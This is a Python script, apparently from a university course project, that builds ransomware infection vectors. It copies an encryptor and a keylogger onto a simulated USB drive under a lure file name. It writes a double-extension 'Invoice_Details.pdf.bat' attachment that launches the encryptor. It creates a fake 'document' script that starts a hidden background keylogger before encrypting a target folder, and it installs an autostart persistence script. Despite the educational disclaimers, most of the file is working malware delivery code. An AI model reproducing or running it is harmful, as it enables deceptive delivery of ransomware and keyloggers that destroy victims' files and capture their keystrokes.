#!/usr/bin/env python3
"""
CSCE 5550 Project- Ransomware Infection Component
Simulates various infection vectors for educational purposes.
"""

import os
import sys
import shutil
import subprocess
from pathlib import Path

class RansomwareInfection:
    def __init__(self, target_dir="~/personal_1000"):
        self.target_dir = os.path.expanduser(target_dir)
        self.current_dir = os.path.dirname(os.path.abspath(__file__))
        
    def create_malicious_usb_simulation(self):
        """Simulate USB-based infection"""
        print("[+] Creating simulated malicious USB infection")
        
        # Create fake USB directory
        usb_dir = os.path.expanduser("~/simulated_usb")
        os.makedirs(usb_dir, exist_ok=True)
        
        # Copy ransomware components to fake USB
        shutil.copy("encrypt.py", usb_dir)
        shutil.copy("keylogger.py", usb_dir)
        
        # Create attractive payload name
        shutil.copy("encrypt.py", os.path.join(usb_dir, "Important_Document.exe"))
        
        print(f"[+] Simulated USB created at: {usb_dir}")
        print("[+] Files copied:")
        for item in os.listdir(usb_dir):
            print(f"    - {item}")
            
    def create_phishing_email_simulation(self):
        """Simulate email attachment infection"""
        print("[+] Creating phishing email simulation")
        
        # Create simulated email attachment
        attachment_dir = os.path.expanduser("~/email_attachments")
        os.makedirs(attachment_dir, exist_ok=True)
        
        # Create PDF-like malicious document
        with open(os.path.join(attachment_dir, "Invoice_Details.pdf.bat"), "w") as f:
            f.write("@echo off\n")
            f.write("echo This is a simulated ransomware execution\n")
            f.write("timeout /t 2 >nul\n")
            f.write(f"python {os.path.join(self.current_dir, 'encrypt.py')} {self.target_dir}\n")
            f.write("pause\n")
            
        print(f"[+] Phishing email attachment created at: {attachment_dir}")
        print("[+] Attachment: Invoice_Details.pdf.bat")
        
    def create_malicious_document(self):
        """Create a malicious document that executes ransomware"""
        doc_content = """#!/bin/bash
# Educational malicious script for CSCE 5550
# This demonstrates document-based infection vectors

echo "Opening document..."
sleep 1
echo "Document opened successfully"

# Background keylogger (infection spread)
nohup python3 """ + os.path.join(self.current_dir, "keylogger.py") + """ > /dev/null 2>&1 &

# Ransomware execution after delay
sleep 3
echo "Document processed"
echo "Initiating security scan..."
python3 """ + os.path.join(self.current_dir, "encrypt.py") + f""" {self.target_dir} &

echo "Process complete"
"""
        
        with open("malicious_document.sh", "w") as f:
            f.write(doc_content)
            
        os.chmod("malicious_document.sh", 0o755)
        print("[+] Created malicious document: malicious_document.sh")
        
    def auto_execute_infection(self):
        """Simulate automatic execution on system startup"""
        print("[+] Setting up auto-execution infection")
        
        # Create startup script
        startup_script = """#!/bin/bash
# Simulated ransomware startup script
sleep 5
cd """ + self.current_dir + """
python3 keylogger.py &
sleep 10
python3 encrypt.py """ + self.target_dir + """
"""
        
        startup_path = os.path.expanduser("~/.config/autostart/ransomware_sim.sh")
        os.makedirs(os.path.dirname(startup_path), exist_ok=True)
        
        with open(startup_path, "w") as f:
            f.write(startup_script)
            
        os.chmod(startup_path, 0o755)
        print(f"[+] Auto-startup script placed at: {startup_path}")
        
    def show_infection_vectors(self):
        """Display available infection vectors"""
        print("\n[+] Available Infection Vectors for Ransomware:")
        print("1. Simulated USB Drive (autorun.inf method)")
        print("2. Phishing Email Attachment (.exe disguised as .pdf)")
        print("3. Malicious Document Execution")
        print("4. System Startup Persistence")
        
        choice = input("\nSelect infection vector (1-4): ")
        
        if choice == "1":
            self.create_malicious_usb_simulation()
        elif choice == "2":
            self.create_phishing_email_simulation()
        elif choice == "3":
            self.create_malicious_document()
        elif choice == "4":
            self.auto_execute_infection()
        else:
            print("[-] Invalid choice")

def main():
    print("=== CSCE 5550 Ransomware Infection Component ===")
    
    infection = RansomwareInfection()
    infection.show_infection_vectors()
    
    print("\n[+] Infection components created successfully")
    print("[+] These are for educational demonstration only")
    print("[+] Always ensure proper authorization before testing")

if __name__ == "__main__":
    main()
